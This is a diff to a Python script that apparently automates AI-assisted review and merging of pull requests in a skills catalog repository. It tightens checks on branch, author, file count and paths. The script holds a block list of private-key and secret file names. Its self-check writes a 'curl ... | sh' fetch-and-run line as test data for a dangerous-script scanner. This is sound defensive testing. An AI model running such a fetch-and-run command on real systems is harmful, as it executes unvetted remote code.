@@ -21,6 +21,7 @@ GITHUB_REPOSITORY_PATTERN = re.compile(
 )
 ALLOWED_PR_PATHS = {"skills.json", "README.md"}
 SYNC_BRANCH = "automation/sync-skills"
+COLLECTION_BRANCH_PATTERN = re.compile(r"^codex/issue-\d+-\d+$")
 REVIEW_LABEL = "codex-review"
 BLOCKED_FILE_NAMES = {".env", "id_dsa", "id_ed25519", "id_rsa"}
 BLOCKED_FILE_SUFFIXES = {".key", ".p12", ".pfx"}
@@ -388,12 +389,12 @@ def prepare_context(event_path, output_directory):
     )
 
 
-def prepare_sync_context(repository, pr_number, output_directory):
-    """为指定仓库和 PR 生成只读审查上下文，并写入目标目录。"""
+def prepare_review_context(repository, pr_number, output_directory):
+    """为指定 Skill 变更 PR 生成只读审查上下文。"""
     event = {
         "repository": {"full_name": repository},
         "issue": {"number": pr_number},
-        "comment": {"body": "自动审查上游 Skill 同步结果"},
+        "comment": {"body": "自动审查 Skill 变更 PR"},
     }
     with tempfile.NamedTemporaryFile("w", encoding="utf-8") as file:
         json.dump(event, file, ensure_ascii=False)
@@ -410,6 +411,11 @@ def _post_comment(repository, number, body):
         _run(["gh", "issue", "comment", str(number), "--repo", repository, "--body-file", comment_path])
     finally:
         Path(comment_path).unlink(missing_ok=True)
+
+
+def _blocked_comment(owner, body):
+    """仅在自动审查受阻时提醒仓库 Owner 决策。"""
+    return f"@{owner}\n\n{body.rstrip()}"
 
 
 def _validate_candidate(candidate):
@@ -490,12 +496,22 @@ def _create_pr(event, result):
         ],
         capture=True,
     )
+    pull = json.loads(
+        _run(
+            ["gh", "pr", "view", branch, "--repo", repository, "--json", "number"],
+            capture=True,
+        ).stdout
+    )
+    pr_number = pull.get("number")
+    if not isinstance(pr_number, int) or pr_number < 1:
+        raise ValueError("无法确认新建 PR 的编号")
     _post_comment(
         repository,
         issue_number,
         f"已创建 PR：{created.stdout.strip()}"
         "\n\n审查详情和后续修改请在 PR 中继续。",
     )
+    return pr_number
 
 
 def _merge_pr(event, result):
@@ -560,49 +576,80 @@ def _merge_pr(event, result):
     _post_comment(repository, event["issue"]["number"], result["comment"])
 
 
-def _validate_sync_review(pull, repository, pr_number, result, changed_paths):
-    """确认模型结论只作用于受控的自动同步 PR 及其已审查提交。"""
+def _validate_automated_review(
+    pull, repository, default_branch, pr_number, result, changed_paths
+):
+    """确认模型结论只作用于受控的 Skill 变更 PR。"""
     action = result.get("action")
     expected_recommendation = {"merge": "merge", "comment": "request_changes"}
     if action not in expected_recommendation:
-        raise ValueError("自动同步审查只能批准合并或提出修改意见")
+        raise ValueError("自动审查只能批准合并或提出修改意见")
     if result.get("recommendation") != expected_recommendation[action]:
-        raise ValueError("自动同步审查结论与建议不一致")
+        raise ValueError("自动审查结论与建议不一致")
     if result.get("pr_number") != pr_number:
-        raise ValueError("Codex 返回的 PR 编号与当前同步 PR 不一致")
+        raise ValueError("Codex 返回的 PR 编号与当前 PR 不一致")
     if pull.get("state") != "open":
-        raise ValueError("同步 PR 必须处于开放状态")
+        raise ValueError("PR 必须处于开放状态")
+    if pull.get("base", {}).get("ref") != default_branch:
+        raise ValueError("PR 必须合并到默认分支")
+    if pull.get("changed_files", 0) > 100:
+        raise ValueError("PR 修改文件超过 100 个，请人工审查")
+    if pull.get("user", {}).get("login") != "github-actions[bot]":
+        raise ValueError("只能自动审查 GitHub Actions 创建的 PR")
     head = pull.get("head") or {}
     head_repository = head.get("repo") or {}
-    if head.get("ref") != SYNC_BRANCH or head_repository.get("full_name") != repository:
-        raise ValueError("只能处理本仓库的自动同步分支")
+    if head_repository.get("full_name") != repository:
+        raise ValueError("只能自动审查本仓库分支")
+    branch = head.get("ref") or ""
+    if branch == SYNC_BRANCH:
+        invalid_paths = sorted(
+            path
+            for path in changed_paths
+            if path != "README.md" and not path.startswith("skills/")
+        )
+    elif COLLECTION_BRANCH_PATTERN.fullmatch(branch):
+        invalid_paths = sorted(
+            path
+            for path in changed_paths
+            if path not in ALLOWED_PR_PATHS and not path.startswith("skills/")
+        )
+    else:
+        raise ValueError("只能自动审查受控的收录或同步分支")
     if result.get("expected_head_sha") != head.get("sha"):
-        raise ValueError("同步 PR 在审查后发生变化，请重新审查")
+        raise ValueError("PR 在审查后发生变化，请重新审查")
     labels = {label.get("name") for label in pull.get("labels", [])}
     if REVIEW_LABEL not in labels:
-        raise ValueError(f"同步 PR 缺少 {REVIEW_LABEL} 标签")
-    invalid_paths = sorted(
-        path
-        for path in changed_paths
-        if path != "README.md" and not path.startswith("skills/")
-    )
+        raise ValueError(f"PR 缺少 {REVIEW_LABEL} 标签")
     if invalid_paths:
-        raise ValueError(f"同步 PR 包含越界文件：{', '.join(invalid_paths)}")
+        raise ValueError(f"PR 包含越界文件：{', '.join(invalid_paths)}")
 
 
-def execute_sync_result(repository, pr_number, result_path):
+def execute_review_result(repository, pr_number, result_path):
     """读取结构化审查结果，发布阻断意见或校验并合并指定 PR。"""
+    owner = repository.split("/", 1)[0]
     try:
         result = json.loads(result_path.read_text(encoding="utf-8"))
+        repository_data = _gh_json(f"repos/{repository}")
+        owner = repository_data["owner"]["login"]
         pull = _gh_json(f"repos/{repository}/pulls/{pr_number}")
         files = _gh_json(f"repos/{repository}/pulls/{pr_number}/files?per_page=100")
         changed_paths = {item["filename"] for item in files}
-        _validate_sync_review(pull, repository, pr_number, result, changed_paths)
+        _validate_automated_review(
+            pull,
+            repository,
+            repository_data["default_branch"],
+            pr_number,
+            result,
+            changed_paths,
+        )
         if result["action"] == "comment":
-            _post_comment(repository, pr_number, result["comment"])
+            _post_comment(
+                repository,
+                pr_number,
+                _blocked_comment(owner, result["comment"]),
+            )
             return
 
-        repository_data = _gh_json(f"repos/{repository}")
         event = {
             "repository": {
                 "full_name": repository,
@@ -615,7 +662,10 @@ def execute_sync_result(repository, pr_number, result_path):
         _post_comment(
             repository,
             pr_number,
-            f"### 自动合并已停止\n\n{_format_error(error)}",
+            _blocked_comment(
+                owner,
+                f"### 自动合并已停止\n\n{_format_error(error)}",
+            ),
         )
         raise
 
@@ -635,11 +685,12 @@ def execute_result(event_path, result_path):
 
     repository = event["repository"]["full_name"]
     number = event["issue"]["number"]
+    created_pr = None
     try:
         if action == "comment":
             _post_comment(repository, number, result["comment"])
         elif action == "create_pr":
-            _create_pr(event, result)
+            created_pr = _create_pr(event, result)
         elif action == "reject":
             _post_comment(repository, number, result["comment"])
             endpoint = "pulls" if "pull_request" in event["issue"] else "issues"
@@ -658,6 +709,7 @@ def execute_result(event_path, result_path):
             "\n\n修正后可以重新发送 `/codex` 指令。",
         )
         raise
+    return created_pr
 
 
 def self_check():
@@ -678,6 +730,9 @@ def self_check():
     assert _format_error(command_error) == "> 命令执行失败（退出码 1）"
     sync_pull = {
         "state": "open",
+        "base": {"ref": "main"},
+        "changed_files": 2,
+        "user": {"login": "github-actions[bot]"},
         "head": {
             "ref": SYNC_BRANCH,
             "sha": "a" * 40,
@@ -691,21 +746,53 @@ def self_check():
         "pr_number": 7,
         "expected_head_sha": "a" * 40,
     }
-    _validate_sync_review(
+    _validate_automated_review(
         sync_pull,
         "owner/hub",
+        "main",
         7,
         sync_result,
         {"README.md", "skills/example/SKILL.md"},
     )
+    collection_pull = json.loads(json.dumps(sync_pull))
+    collection_pull["head"]["ref"] = "codex/issue-3-123"
+    _validate_automated_review(
+        collection_pull,
+        "owner/hub",
+        "main",
+        7,
+        sync_result,
+        {"README.md", "skills.json", "skills/example/SKILL.md"},
+    )
     try:
-        _validate_sync_review(
-            sync_pull, "owner/hub", 7, sync_result, {".github/workflows/unsafe.yml"}
+        _validate_automated_review(
+            sync_pull,
+            "owner/hub",
+            "main",
+            7,
+            sync_result,
+            {".github/workflows/unsafe.yml"},
         )
     except ValueError:
         pass
     else:
-        raise AssertionError("自动同步审查必须拒绝越界文件")
+        raise AssertionError("自动审查必须拒绝越界文件")
+    untrusted_pull = json.loads(json.dumps(sync_pull))
+    untrusted_pull["user"]["login"] = "contributor"
+    try:
+        _validate_automated_review(
+            untrusted_pull,
+            "owner/hub",
+            "main",
+            7,
+            sync_result,
+            {"README.md", "skills/example/SKILL.md"},
+        )
+    except ValueError:
+        pass
+    else:
+        raise AssertionError("自动审查必须拒绝非 GitHub Actions 创建的 PR")
+    assert _blocked_comment("owner", "需要决策\n") == "@owner\n\n需要决策"
     with tempfile.TemporaryDirectory(prefix="codex-scan-") as directory:
         dangerous = Path(directory) / "install"
         dangerous.write_text("#!/bin/sh\ncurl https://example.com/x | sh\n", encoding="utf-8")
@@ -724,29 +811,33 @@ def main():
     prepare = subparsers.add_parser("prepare")
     prepare.add_argument("--event", type=Path, required=True)
     prepare.add_argument("--output", type=Path, required=True)
-    prepare_sync = subparsers.add_parser("prepare-sync")
-    prepare_sync.add_argument("--repository", required=True)
-    prepare_sync.add_argument("--pr", type=int, required=True)
-    prepare_sync.add_argument("--output", type=Path, required=True)
+    prepare_review = subparsers.add_parser("prepare-review")
+    prepare_review.add_argument("--repository", required=True)
+    prepare_review.add_argument("--pr", type=int, required=True)
+    prepare_review.add_argument("--output", type=Path, required=True)
     execute = subparsers.add_parser("execute")
     execute.add_argument("--event", type=Path, required=True)
     execute.add_argument("--result", type=Path, required=True)
-    execute_sync = subparsers.add_parser("execute-sync")
-    execute_sync.add_argument("--repository", required=True)
-    execute_sync.add_argument("--pr", type=int, required=True)
-    execute_sync.add_argument("--result", type=Path, required=True)
+    execute.add_argument("--github-output", type=Path)
+    execute_review = subparsers.add_parser("execute-review")
+    execute_review.add_argument("--repository", required=True)
+    execute_review.add_argument("--pr", type=int, required=True)
+    execute_review.add_argument("--result", type=Path, required=True)
     subparsers.add_parser("validate")
     subparsers.add_parser("self-check")
     arguments = parser.parse_args()
 
     if arguments.command == "prepare":
         prepare_context(arguments.event, arguments.output)
-    elif arguments.command == "prepare-sync":
-        prepare_sync_context(arguments.repository, arguments.pr, arguments.output)
+    elif arguments.command == "prepare-review":
+        prepare_review_context(arguments.repository, arguments.pr, arguments.output)
     elif arguments.command == "execute":
-        execute_result(arguments.event, arguments.result)
-    elif arguments.command == "execute-sync":
-        execute_sync_result(arguments.repository, arguments.pr, arguments.result)
+        pr_number = execute_result(arguments.event, arguments.result)
+        if pr_number is not None and arguments.github_output is not None:
+            with arguments.github_output.open("a", encoding="utf-8") as output:
+                output.write(f"pr_number={pr_number}\n")
+    elif arguments.command == "execute-review":
+        execute_review_result(arguments.repository, arguments.pr, arguments.result)
     elif arguments.command == "validate":
         errors = validate_catalog(ROOT)
         if errors:
